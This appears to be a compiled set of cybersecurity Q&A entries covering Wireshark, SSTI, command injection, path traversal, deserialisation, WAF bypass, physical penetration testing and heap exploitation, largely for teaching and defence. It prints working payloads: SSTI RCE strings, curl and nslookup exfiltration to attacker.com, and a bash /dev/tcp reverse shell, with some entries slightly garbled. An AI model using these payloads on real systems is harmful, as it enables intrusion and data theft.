Wireshark for security analysis: powerful packet capture and protocol analysis tool. Interface: click interface to start capture; or File > Open PCAP; display filter bar (apply after capture); capture filter bar (filter during capture -- BPF syntax). Display filters for security: tcp.flags.syn == 1 and tcp.flags.ack == 0 (SYN packets only; find port scans); ip.addr == 192.168.1.100 (all traffic to/from IP); tcp.port == 22 (SSH traffic); http.request.method == POST (all HTTP POSTs); dns (all DNS traffic); tls (TLS traffic); frame contains password (search all packets for string password); http.response.code == 401 (authentication failures); tcp.analysis.retransmission (retransmissions may indicate dropped connections or SYN flood). Following streams: right-click packet > Follow > TCP Stream (reconstructs full conversation; read HTTP requests/responses; see credentials if plaintext); Follow > UDP Stream; Follow > TLS Stream (if session key log available). Extracting files: File > Export Objects > HTTP (export files transferred over HTTP; images, executables, documents); or use NetworkMiner which auto-extracts. Decrypting TLS: if you have the server private key (RSA key exchange -- TLS 1.2 without PFS): Edit > Preferences > Protocols > TLS > RSA Keys list; add server IP, port, protocol, private key file; Wireshark decrypts; if ECDHE (PFS): need session keys; set SSLKEYLOGFILE env variable in Chrome/Firefox; Wireshark loads key log: Edit > Preferences > Protocols > TLS > (Pre)-Master Secret log filename; all TLS traffic decrypted. Useful statistics: Statistics > Conversations (IP or TCP; find top talkers and unusual pairs); Statistics > Protocol Hierarchy (protocol distribution; identify unexpected protocols); Statistics > IO Graphs (traffic over time; find spikes); Statistics > HTTP > Requests (all HTTP request URIs). Common security scenarios: capture at network boundary; filter for SYN floods (tcp.flags.syn==1 AND tcp.flags.ack==0 high rate from single IP); find cleartext credentials (http contains password; ftp contains PASS; telnet; pop contains PASS); identify DNS tunneling (long subdomains: dns.qry.name contains.attacker.com with high length and frequency); detect ARP spoofing (arp duplicate IP with different MAC; arp.opcode == 2 AND arp.src.hw_mac != expected).
What is server-side template injection (SSTI)?

SSTI (Server-Side Template Injection): attacker injects template syntax into user-controlled input processed by server-side template engine; can lead to RCE. Template engines: Jinja2 (Python/Flask), Twig (PHP), FreeMarker (Java), Velocity (Java), Pebble (Java), Smarty (PHP), ERB (Ruby on Rails), Handlebars (JavaScript), Pug (JavaScript). How it works: application uses template: render(Hello, {{ username }}); if username = {{7*7}} and template renders it: response: Hello, 49 (expression evaluated); not just XSS -- code executed server-side. Detection: inject: ${7*7}, {{7*7}}, #{7*7}, <%= 7*7 %>, {7*7}; if response contains 49: SSTI confirmed; error messages may reveal template engine. Engine identification: {{7*7}} (49 = Jinja2 or Twig); {{7*7}} gives error (Smarty or FreeMarker); ${7*7} gives 49 (Freemarker); PortSwigger decision tree for systematic identification. Exploitation by engine: Jinja2 (Python/Flask): access Python globals; RCE: {{config.class.init.globals.builtins.open(/etc/passwd).read()}} or: {{self._TemplateReference__context.cycler.class.init.globals.os.popen(id).read()}}; Twig (PHP): {{_self.env.registerUndefinedFilterCallback(exec)}}{{_self.env.getFilter(id)}} or 7.7 {{7*7}} = 49; FreeMarker (Java): ${freemarker.template.utility.Execute?new()(id)}; Velocity (Java): #set($x =)#set($rt = $x.class.forName(java.lang.Runtime))#set($chr = $x.class.forName(java.lang.Character))#set($str = $x.class.forName(java.lang.String))#set($ex=$rt.getRuntime().exec(id))$ex; Pebble: {{someString.toUPPERCASE()}} -- limited but can call Java methods. Prevention: never pass user input to template render function: render(template=user_input) -- critical mistake; use sandboxed template evaluation if user-controlled templates required (Jinja2 sandbox -- but sandbox bypasses exist); separate template from data: only inject variables into templates ({{ username }}) not full template expressions from user input; allowlist of allowed template variables; Python: use safe string formatting (f-strings,.format()) instead of template engines for user-controlled content. Tools: tplmap (automated SSTI detection and exploitation); SSTImap; Burp Scanner detects common SSTI patterns.
What is content injection and HTML injection?

HTML injection: attacker injects raw HTML into page; server reflects or stores attacker HTML; browser renders it. Difference from XSS: XSS injects JavaScript (script execution); HTML injection: injects HTML markup without JavaScript; but HTML injection can lead to: phishing (render fake login form in legitimate site context); defacement (change page content); UI redirection. Example: page displays user comment unsanitised: User said: attacker input; if attacker submits: Click here for free gift!; page renders actual link; users see legitimate site with malicious content. Impact without JS: inject form: form action=https://attacker.com/steal; input type=text name=password; users submit credentials to attacker; inject img tag (CSRF, tracking, XSS in some contexts); inject frames (embed attacker content in page); defacement; open redirect injection. Stored vs reflected HTML injection: reflected: user input reflected in response (search queries, error messages); stored: injection persists in database (comments, profile fields); stored more dangerous (affects all visitors, not just victim clicking malicious link). Context matters: HTML entity context: inject breaks out of text node into HTML; attribute context: value= inject href= (attribute injection); can inject new attributes including event handlers (onclick=). Testing: inject HTML markup in all user-input fields; common test: paragraph tag with distinctive text; check if rendered as HTML or escaped; test single field at a time to localise injection point. Mitigation: HTML encode all user-supplied output: < to <, > to >; use framework output encoding (Django: {{var}} auto-escapes; React JSX: {variable} auto-escapes; do not use dangerouslySetInnerHTML or similar without sanitisation); use Content Security Policy as defence in depth; for rich text (editor allowing some HTML): use allowlist-based HTML sanitiser (OWASP Java HTML Sanitizer, DOMPurify, Sanitize gem); denylist-based sanitisers always have bypasses.
What is the difference between authentication and authorisation?

Authentication vs Authorisation: two fundamental security concepts; often confused but distinct. Authentication (AuthN): verify identity -- WHO are you? Confirm user is who they claim to be; methods: something you know (password, PIN, security question), something you have (OTP token, hardware key, mobile app), something you are (fingerprint, face, iris); verification against: password database (compare hash), certificate (verify signature), IdP (OAuth, SAML); results in: authenticated session (session token, JWT); error case: 401 Unauthorized (not authenticated). Authorisation (AuthZ): verify permission -- WHAT can you do? Determine if authenticated user has permission for requested action; types: RBAC (role determines permissions), ABAC (attributes determine permissions), ACL (resource has list of permitted principals), capability-based; verification against: policy database (permissions for user role), ACL on resource, policy engine (OPA); error case: 403 Forbidden (authenticated but not authorised to access resource). Common mistakes: confusing order: authenticate FIRST, authorise SECOND; never authorise before authenticating; missing authorisation check: API endpoint checks authentication (is there a valid token?) but not authorisation (does this user have access to THIS resource?); authorisation in frontend only: hiding button for unauthorised users but not checking server-side (trivially bypassed); parameter-based authorisation: user provides role or permission in request that server trusts without validation; checking authentication at login only: validating session exists but not checking if session owner has permission for each resource; trust after first auth: assuming authenticated user is authorised for everything in subsequent requests. Practical example: HTTP 401 = not authenticated (provide credentials); HTTP 403 = authenticated but not authorised (you do not have permission); application should return 403 not 404 for resources user exists but cannot access (returning 404 leaks resource existence information -- some argue 404 is better to prevent enumeration, depends on context). Multi-factor authentication: multiple authentication factors; does not grant additional authorisation; increases confidence in identity claim; common requirement for sensitive operations (wire transfer requires MFA even if already authenticated with password).
What is SQL injection via second order injection?

Second-order SQL injection (persistent SQLi): user-supplied malicious data stored safely in database; retrieved and used unsafely in subsequent SQL query; more complex to find than first-order. How it differs from first-order: first-order: injection point and vulnerable query are in same request; second-order: injection point (registration) and vulnerable query (login) are in different requests/features; more dangerous: attacker data persists; executes when triggered by any code path that retrieves and uses the data. Example: step 1 -- registration (safe storage): username field uses parameterised query; INSERT INTO users VALUES (?, ?) with (admin--, password); stored as admin-- in database (safely); step 2 -- password change (vulnerable retrieval): application retrieves username from DB (admin--); builds new query with string concatenation: UPDATE users SET password=newpass WHERE username= + username; becomes: UPDATE users SET password=newpass WHERE username=admin-- (-- comments out rest of query); updates admin account password; attacker changes admin password. Another example: profile bio stored safely (parameterised); bio retrieved and passed to search: SELECT * FROM content WHERE tags LIKE % + bio + %; if bio = % UNION SELECT password,null FROM users--: data exfiltrated when bio used in search. Why harder to find: static analysis might find the vulnerable query but conclude data from DB is trusted; need to trace data from user input through storage to retrieval to use in query; automated scanners often miss (different request triggers vulnerability); testing requires: enter malicious payload in storage point; trigger retrieval and use; observe SQL error or behaviour change. Finding second-order: identify all data storage points (registration, profile, settings, comments); for each stored value: identify all places it is retrieved and used; check if any use in SQL query without parameterisation; test: store SQL metacharacter (single quote); trigger retrieval; check for SQL error. Prevention: parameterise ALL queries that use data from the database, not just queries that use direct user input; data retrieved from DB may have come from user originally; treat data from DB as untrusted if it originated from external input; use ORM with parameterised queries throughout.
What is a command injection vulnerability?

Command injection: attacker injects OS commands into application; executed by server with application privileges. How it works: application passes user input to shell command without sanitisation; ping.php?host=192.168.1.1 calls: system(ping -c 1 host_input); attacker submits: host=192.168.1.1; cat /etc/passwd; semicolon separates commands; server executes ping AND cat /etc/passwd; output returned. Injection operators: ; semicolon (execute sequentially); && AND (execute second if first succeeds); || OR (execute second if first fails); | pipe (pipe output to next command); newline character; backtick (old-style command substitution); $() command substitution; all serve as command separators or injection points. Out-of-band injection: no output in response; use DNS or HTTP callback: host=192.168.1.1 && curl http://attacker.com/$(whoami); or DNS: nslookup $(id | base64).attacker.com; response to attacker server. Blind timing: host=192.168.1.1 && sleep 5; if response delayed 5 seconds: command injection confirmed; no output needed. Context: command injection inside quoted string: command ping -c 1 HOST; if HOST = x -c 10 y: becomes ping -c 1 x -c 10 y; argument injection not command injection (limited impact but adds flags); test: inject quotes, semicolons, pipes. Exploitation: from command injection to full shell: spawn reverse shell: host=x; bash -i >& /dev/tcp/attacker/4444 0>&1; or: host=x; python3 -c import pty;pty.spawn(/bin/sh); upgrade to full TTY. Mitigation: never pass user input to shell; use language APIs that do not invoke shell: subprocess without shell=True (Python): subprocess.run([ping, -c, 1, host_input], shell=False); host_input is single argument, not parsed by shell; parameterise at library level; Java: ProcessBuilder without shell invocation; PHP: avoid exec, system, shell_exec, passthru with user input; if OS command unavoidable: allowlist validation (only [a-z0-9.] in hostname); reject anything else; escapeshellarg() and escapeshellcmd() exist but easily bypassed -- prefer allowlist over escaping.
What is insecure deserialisation and what languages are affected?

Insecure deserialisation: converting untrusted data into objects without proper validation; allows attackers to tamper with object state or trigger code execution. Affected languages: Java: ObjectInputStream.readObject() with native serialisation (AC ED magic bytes); Python: pickle.loads(), yaml.load() without Loader, shelve; PHP: unserialize() with magic methods; Ruby: Marshal.load();.NET: BinaryFormatter, SoapFormatter, DataContractSerializer with TypeNameHandling.All; JavaScript/Node.js: node-serialize, kryo (if misconfigured). Java: most historically exploited; gadget chains: ysoserial tool generates exploit payloads for: CommonsCollections, Spring Framework, JDK, Hibernate, MyFaces; vulnerable when: untrusted Java serialised bytes deserialized; attacker knows or guesses classpath libraries; entry points: Java RMI (Remote Method Invocation), JMX, HTTP endpoints accepting serialised objects (application/x-java-serialized-object Content-Type), JMS queues, AMF (Flash remoting), Kryo, XStream (XML). Detection: look for AC ED 00 05 bytes (Java serialisation magic); base64 encoded: rO0AB (AC ED in base64); Content-Type: application/x-java-serialized-object; endpoints accepting serialised objects. PHP: magic methods exploited: __wakeup() called on deserialise; __destruct() called when garbage collected; __toString() called when object used as string; POP chain (Property Oriented Programming): link objects via magic methods to reach file_put_contents, eval, exec. Python pickle: pickle.loads() is RCE if attacker controls data: any object with __reduce__ method returns arbitrary callable; immediately exploit. Prevention: never deserialise untrusted data; use safer formats (JSON, Protocol Buffers, MessagePack) without code execution; if Java serialisation unavoidable: implement ObjectInputFilter (Java 9+) to allowlist permitted classes; sign and verify serialised data integrity (HMAC); monitor for deserialisation class loading events (Java security manager); isolation: run deserialisation in sandboxed process with minimal permissions.
How do you perform physical penetration testing?

Physical penetration testing: assess physical security controls; test whether physical access barriers protect sensitive areas. Scope: define clear rules of engagement; signed authorisation letter from appropriate authority (carry at all times); what areas are in scope (data centre, server room, offices); what techniques are authorised (tailgating, lock picking, RFID cloning, dumpster diving); emergency contact if apprehended. Techniques: tailgating/piggybacking: wait for employee to badge through; follow them without badging; social obligation to hold door; counter-test: do employees challenge tailgaters?; pretexting: pose as maintenance, IT support, delivery person, auditor, vendor; research company beforehand (LinkedIn, website); prepare appropriate props (uniform, clipboard, equipment, business cards); RFID cloning: capture proximity card signal with reader (Proxmark3, Chameleon); clone to blank card; replicate at distance (extended range reader up to 1 metre); clone badge from conference, lobby, or close proximity; lockpicking and bypassing: physical lock picking (bump keys, pick tools); bypass locks (credit card shimming, under-door tools, loidle); padlock bypass; window bypass; cable management to reach locked doors; dumpster diving: search discarded materials (documents, hardware, credentials, organisation structure); shredding policy assessment; camera assessment: identify CCTV coverage gaps; test if cameras monitored live vs recorded; social engineering reception: test if visitors verified and escorted; can you claim appointment with executive and get access?. Tools: Proxmark3 (RFID cloning); lock picks and bump keys; Flipper Zero (multi-purpose: RFID, NFC, IR, radio); under-door tool; request tool (thin tool to pull door handle on other side); camera assessment with video. Deliverables: narrative of what was achieved (entered server room, accessed unattended workstation, captured RFID badges); photographic evidence; gap analysis vs security policy; risk-rated findings; remediation: receptionist training, lock upgrade, tailgating detection, badge access logging and alerting, clean desk policy enforcement. Legal: strict scope; authorisation letter names and photos if possible; immediately identify to police if apprehended (do not claim innocence -- show authorisation letter); do not enter areas explicitly excluded from scope.
What is a race condition vulnerability in web applications?

Race condition (TOCTOU -- Time of Check to Time of Use): concurrent requests processed in unexpected order; both pass single-use check before either registers result. How it works: single-use coupon: user sends 10 simultaneous requests to redeem coupon; server checks if coupon used (all 10 check before any marks as used -- all return valid); server attempts to apply all 10 (first one marks used; 9 more already passed check); coupon applied 10 times. Check-then-act window: 1. Check: read balance = $100; 2. Act: withdraw $100; if two concurrent withdrawals: both check sees $100; both proceed; result: -$100 balance. Examples: coupon and promo code reuse; gift card balance exhaustion; duplicate payment processing; concurrent API key generation (same key generated); account creation with same email (race between uniqueness check and insert); limited edition stock over-allocation (check quantity > 0, then decrement). Detection and testing: Burp Turbo Intruder: send many requests simultaneously; single-packet attack (HTTP/2 allows multiple requests in single TCP packet -- synchronises server receipt); Race condition test: for (coupon, gift card, transfer) endpoints: send 10-50 simultaneous requests with same token/coupon. Turbo Intruder single-packet technique: group requests together; send all in one TCP segment using HTTP/2 multiplexing or HTTP/1.1 pipeline; removes network jitter from timing; requests arrive simultaneously at server. Exploitation impact: financial: double-spend, coupon reuse, balance overdraft; inventory: order more than available; authentication: bypass rate limiting (many simultaneous login attempts hit before lockout counter updates); TOCTOU on file operations: check file existence, then open; attacker replaces symlink between check and open. Mitigation: atomic database operations: UPDATE coupons SET used=1 WHERE code=X AND used=0 RETURNING id (check and update in single atomic operation; row count 0 = already used); database transactions with appropriate isolation level (SERIALIZABLE prevents race conditions but impacts performance); distributed locks (Redis SETNX for mutual exclusion; lock before critical section; release after); idempotency keys: unique key per operation; duplicate key = duplicate rejection (even if processed twice, effect applied once).
What is path traversal and directory traversal?

Path traversal (directory traversal): attacker manipulates file paths to access files outside intended directory; read /etc/passwd, source code, credentials, or overwrite files. How it works: application uses user input to construct file path: readFile(base_dir + user_input); user_input =../../etc/passwd; concatenated path = /var/www/html/../../etc/passwd = /etc/passwd;../ navigates up one directory level. Variants: basic:../../../etc/passwd; URL encoded: %2e%2e%2f (../); double encoded: %252e%252e%252f (double URL encoding: server decodes once before validation, decodes again when accessing); null byte:../../../../etc/passwd%00.jpg (add.jpg to bypass extension check; null byte terminates string in C -- file opened as /etc/passwd); Windows:..\ backslash;..\..\..\ (backslash + forward slash mix); unicode: %c0%ae%c0%ae%c0%af (UTF-8 overlong encoding of../ -- old Java/Tomcat bypass); UNC path injection (Windows): \attacker\share. What you can read: /etc/passwd (user list); /etc/shadow (password hashes if root); /etc/hosts (internal network map); ~/.ssh/id_rsa (SSH private key); web application source code (config files with DB credentials, API keys); /proc/self/environ (environment variables -- may contain secrets); /proc/net/tcp (network connections); Windows: C:\Windows\System32\drivers\etc\hosts; C:\inetpub\wwwroot\web.config (IIS config with connection strings); C:\Users\Administrator\.ssh\id_rsa. Testing: inject../ in all file-related parameters: filename=, file=, path=, template=, include=, page=; URL parameters, form fields, cookies, HTTP headers; for every file serve endpoint; test all encoding variants. File upload with traversal: filename=../../config.php (overwrite config); filename=../../../var/www/html/shell.php (write web shell). Mitigation: resolve absolute path before check: Python: os.path.realpath(user_path) then check if starts with base_dir; never trust user-supplied paths; use whitelist of allowed filenames or IDs (not paths); chroot jail: confine application to specific directory (cannot access files outside jail even with traversal).
What is SQL injection prevention in code?

SQL injection prevention: write code that cannot execute injected SQL. Parameterised queries (prepared statements): most important mitigation; separate SQL structure from data; database treats parameter values as data not SQL code. Python with parameterised queries: cursor.execute(SELECT * FROM users WHERE username = %s AND password_hash = %s, (username, password_hash)); the %s placeholders are parameters; database handles escaping; cannot inject SQL via parameters. Java PreparedStatement: PreparedStatement stmt = conn.prepareStatement(SELECT * FROM users WHERE id = ?); stmt.setInt(1, userId); ResultSet rs = stmt.executeQuery(); PHP PDO: $stmt = $pdo->prepare(SELECT * FROM users WHERE id = ?); $stmt->execute([$userId]); Node.js (mysql2): connection.execute(SELECT * FROM users WHERE id = ?, [userId], callback); wrong (vulnerable): cursor.execute(SELECT * FROM users WHERE id= + userId) -- string concatenation. Stored procedures (if parameterised): call stored procedure with parameters: CALL GetUser(?); with parameterised user_id; procedure body uses parameters without dynamic SQL (see stored procedure SSTI entry). ORM (Object-Relational Mapping): SQLAlchemy (Python): User.query.filter_by(username=username) -- generates parameterised query automatically; Django ORM: User.objects.filter(username=username) -- parameterised; Hibernate (Java): session.createQuery(FROM User WHERE username = :username).setParameter(username, username) -- parameterised; raw SQL in ORM: use ORM parameterisation even for raw: session.execute(text(SELECT * FROM users WHERE id = :id), {id: userId}) -- parameterised raw SQL. Allowlist input validation: validate and restrict input to known-good characters; username: only alphanumeric and underscore; reject anything else; does not replace parameterised queries (defence in depth). Least privilege database user: application database user: SELECT, INSERT, UPDATE, DELETE only; no DROP, CREATE, xp_cmdshell, FILE; limits damage from SQLi even if parameterisation fails. Error handling: catch SQL exceptions; return generic error to user (never database error message with query structure); log internally. WAF: last resort defence; not reliable SQLi prevention; easily bypassed; proper parameterisation is the fix. Testing: with automated tools (sqlmap) and manual injection of: single quote, double quote, boolean conditions, UNION SELECT, time delays; verify both successful and unsuccessful injection attempts are handled correctly.
What is the principle of defence in depth?

Defence in depth: multiple layered security controls; no single point of failure defeats all defences; attacker must overcome multiple independent barriers; based on military strategy. Layers: Network perimeter: firewall, IPS/IDS, DDoS mitigation, edge WAF; filters obviously malicious traffic before reaching application. Network segmentation: VLANs, micro-segmentation; limits blast radius if perimeter breached; attacker cannot move freely even inside network. Endpoint security: antivirus, EDR, application whitelisting; detects and blocks malware on endpoint; catches threats that bypass network controls. Application security: input validation, output encoding, parameterised queries, CSRF protection, authentication, authorisation; protects at application layer. Authentication: MFA, strong passwords, account lockout, session management; makes credential-based attacks harder even if password compromised. Authorisation: RBAC, least privilege; limits what authenticated attacker can access. Encryption: TLS in transit, at-rest encryption; protects data even if other layers breached. Monitoring and detection: SIEM, EDR alerts, anomaly detection; detects breaches in progress. Incident response: containment, eradication, recovery; limits damage duration. User awareness: phishing awareness training; last human line of defence. Why each layer matters: AV missed fileless malware (network detection catches beaconing); WAF blocked SQLi in one parameter but SSTI via another (proper coding prevents); MFA prevented password breach account takeover; network segmentation stopped ransomware spreading from finance to R&D. Real world example: attacker sends phishing email: User awareness training: 80% do not click; Email gateway: blocks 15% with attachment scanning; EDR: detects macro execution in 4%; Network monitoring: detects C2 beaconing in remaining; Response: contains and remediates before attacker reaches critical data. All controls working together reduce risk to acceptable level even though individually each can be bypassed by sufficiently motivated attacker. Failure mode: single control failure does not cause compromise; cost for attacker increases with each layer; determines economic viability of attack.
What is security governance and risk management?

Security governance: leadership, processes, and structures ensuring security is aligned with business objectives and managed effectively. Components: Policies: high-level statements of security intent (Acceptable Use Policy, Information Security Policy, Remote Access Policy); approved by executive or board; mandatory compliance; reviewed annually. Standards: specific requirements implementing policy (password must be 12+ characters, MFA required for remote access); more technical than policy; referenced in policies. Procedures: step-by-step instructions for implementing standards (how to set up MFA, how to create user account); operational level. Guidelines: recommended practices (not mandatory); helpful context. Roles: CISO (Chief Information Security Officer): security strategy, executive reporting, risk ownership; Security team: technical implementation; Data owners: business leaders responsible for specific data; IT/DevOps: implement controls designed by security; Internal audit: independent assurance that controls working. Risk management: NIST Risk Management Framework (RMF): categorise, select controls, implement, assess, authorise, monitor; ISO 27005: information security risk management standard; Risk = Likelihood x Impact: qualitative (High/Medium/Low) or quantitative (annual expected loss); Risk treatment: avoid (eliminate the risk), transfer (cyber insurance), mitigate (implement controls), accept (residual risk below threshold). Risk register: central record of all identified risks; risk owner, inherent risk rating, controls, residual risk rating, treatment plan, review date; reviewed quarterly or after significant changes. KPIs and KRIs: KPI (Key Performance Indicator): how well are controls working? (% assets patched within SLA, % staff completed training, time to close vulnerabilities); KRI (Key Risk Indicator): early warning of increasing risk (# failed access attempts trend, # unpatched critical vulnerabilities, # unreviewed access rights). Board reporting: quarterly or semi-annual security report to board; business language (not technical); risk posture vs risk appetite; cyber insurance coverage review; regulatory compliance status; significant incidents and lessons learned; security investment ROI.
What is cloud-native security monitoring?

Cloud-native security monitoring: monitoring cloud infrastructure and workloads using cloud-native tools and approaches. AWS native: GuardDuty: threat detection service analysing CloudTrail, VPC Flow Logs, DNS query logs; findings: compromised EC2 (connecting to known C2), unusual API calls (credential exfiltration), crypto mining (unusual compute patterns), reconnaissance (port scanning from EC2), data exfiltration (S3 access from unusual IP); enable in all regions; findings to Security Hub. CloudTrail: logs all AWS API calls (who called what API from which IP at what time); critical: data events (S3 GetObject, DynamoDB GetItem) can be enabled separately; management events enabled by default; CloudWatch Logs integration; analyse with Athena (SQL queries over CloudTrail S3 logs). Config: compliance checking; Config rules check resources against expected configuration; alert on non-compliant resources; configuration history (who changed what when). Security Hub: aggregates findings from GuardDuty, Inspector, Macie, Config, Firewall Manager, and third-party tools; prioritised security findings; automated remediation with EventBridge. Macie: ML-based sensitive data discovery in S3; finds PII, credentials, encryption keys; alerts on public or unencrypted buckets with sensitive data. Inspector: vulnerability scanning for EC2, ECR images, Lambda; CVE assessment; network reachability analysis. VPC Flow Logs: IP-level network telemetry; source IP, destination IP, port, protocol, bytes, action; analyse for: east-west movement, data exfiltration, port scanning, unusual protocols. EventBridge + Lambda automation: trigger Lambda on GuardDuty finding; auto-isolate EC2 (modify security group to deny all), disable compromised IAM credentials, notify SOC via SNS. Azure: Microsoft Defender for Cloud (security posture + threat protection); Microsoft Sentinel (cloud-native SIEM; queries with KQL); Defender for Identity (AD threat detection); Activity Log + Diagnostic Settings for resource logging. GCP: Security Command Center; Cloud Audit Logs; Chronicle (Google SIEM); Forseti (open-source policy-as-code); VPC Service Controls (data exfiltration prevention).
What are the OWASP Top 10 for 2021?

OWASP Top 10 2021: list of most critical web application security risks. A01: Broken Access Control (moved up from A05): most common finding; IDOR, privilege escalation, CORS misconfiguration, missing function-level access control; 94% of applications tested for some form of broken access control. A02: Cryptographic Failures (was Sensitive Data Exposure): weak cryptography; HTTP instead of HTTPS; weak algorithms (MD5, SHA1, DES, RC4); hardcoded keys; insufficient key lengths; missing certificate validation. A03: Injection (was A01): SQL, NoSQL, command, LDAP, OS, expression language injection; interpreter treats hostile data as commands or queries. A04: Insecure Design (new): security flaws by design rather than implementation; missing threat model; no security design review; business logic flaws; trust assumptions in design. A05: Security Misconfiguration (was A06): default credentials; unnecessary features enabled; error messages with sensitive info; missing security headers; cloud misconfiguration; XXE in XML processors. A06: Vulnerable and Outdated Components (was A09): using components with known CVEs; Log4Shell example; no SBOM or inventory; failure to patch promptly. A07: Identification and Authentication Failures (was Broken Authentication): weak passwords allowed; no MFA; session fixation; credential stuffing not prevented; insecure session management. A08: Software and Data Integrity Failures (new): code and infrastructure without integrity verification; CI/CD pipeline attacks; insecure deserialisation (previously A08 2017); auto-update without integrity check (SolarWinds type attack). A09: Security Logging and Monitoring Failures (was Insufficient Logging): login failures not logged; no alerting; logs not monitored; SIEM not in place; insufficient log detail for forensics. A10: Server-Side Request Forgery (SSRF) (new): server fetches user-specified URL; access internal services, cloud metadata, local files; increasingly common in cloud environments. OWASP methodology: data driven from real application security testing data; not theoretical; reflects what practitioners actually find; updated every 3-4 years; application: code reviews check for each category; automated scanners map to categories; pentest reports reference OWASP categories; developer training covers each category.
How do you bypass WAF filtering?

WAF bypass techniques: evade Web Application Firewall signature-based filtering. Encoding and obfuscation: URL encoding: single quote %27 (or %2527 double-encoded); space %20 or + or /**/ (comment as space in SQL); HTML encoding in reflected input: < (if WAF checks HTML context); case variation: SeLeCt (some WAF regex case-sensitive); hexadecimal encoding in SQL: 0x61646d696e (hex for admin); SQL comments: UN/**/ION SEL/**/ECT; version-specific comments in MySQL: /*!UNION*/ SELECT. HTTP protocol manipulation: chunked Transfer-Encoding: split payload across multiple chunks (some WAFs do not reassemble); HTTP parameter pollution: param=normal&param=malicious (some frameworks take last value; WAF checks first); content-type manipulation: application/json bypass if WAF only checks application/x-www-form-urlencoded; JSON injection via body when WAF only checks URL parameters; HTTP method override: X-HTTP-Method-Override: PUT header with POST request; WAF checks method not override. Request smuggling: HTTP request smuggling to bypass WAF (WAF sees safe request; backend sees injected malicious request). Application-specific: wildcard characters: in SQL LIKE clause injection; function alternatives: MID() instead of SUBSTRING(), IF() instead of CASE WHEN, CHAR() to build strings; MySQL specific: @@version, version(); database-specific syntax; payload case: wAF might not match wHiTeLiSt; Encoding chains: double URL encode then HTML encode; application decodes twice; WAF decodes once (misses payload). IP-based: rotate source IPs (distributed attack bypasses per-IP rate limiting); IPv6 if WAF only blocks IPv4. WAF fingerprinting: send payloads known to trigger WAFs; compare responses (403 vs 200 vs redirect); identify WAF type (Cloudflare: CF-RAY header; ModSecurity: Server header; Barracuda: Barracuda header); use known bypass techniques for identified WAF. Legal and ethical: WAF bypass testing only on authorised systems; WAF bypass techniques for penetration testing to demonstrate WAF is insufficient alone; conclusion: WAF is not a fix for insecure code; proper secure coding required; WAF is additional layer, not substitute.
What is heap exploitation in binary security?

Heap exploitation: memory corruption vulnerabilities in dynamically allocated memory (heap); more complex than stack-based exploitation. Heap allocators: glibc malloc (ptmalloc2): Linux standard; chunk-based; bins for free chunks; metadata stored inline with chunks (prev_size, size, fd, bk pointers); tcmalloc (Google): used in Chrome; jemalloc (FreeBSD, Firefox, Rust allocator): different design. Common vulnerabilities: heap overflow: write past allocated buffer into adjacent chunk metadata or data; corrupts chunk headers or object fields; use-after-free (UAF): free chunk then continue using pointer; freed memory may be reallocated to different object; subsequent operations on stale pointer affect new object; double-free: free same pointer twice; corrupts free list; heap spray: allocate many objects at predictable addresses; increase probability of controlling key memory regions for exploit reliability. Classic glibc techniques (ptmalloc2): unlink attack: overwrite fd/bk pointers of free chunk; trigger unlink() macro during malloc consolidation; arbitrary write-what-where; House of techniques: House of Force: overwrite wilderness chunk size; control malloc to return arbitrary pointer; House of Einherjar: overwrite prev_size to trigger backward consolidation; control freed chunk address; House of Orange: craft malloc_hook overwrite; House of Lore: smallbin attack; fastbin dup: double-free in fastbin; allocate twice at same address; place object with controlled content at kernel-controlled address; tcache attacks: tcache introduced in glibc 2.26; simpler freelist; tcache poisoning: free chunk, overwrite fd pointer (only 1 step before alloc unlike fastbin 2); allocate to arbitrary address; tcache dup: double-free without mitigation check in old versions; safe-linking: glibc 2.32+ XOR encodes tcache/fastbin fd pointers with heap address; mitigates pointer corruption.
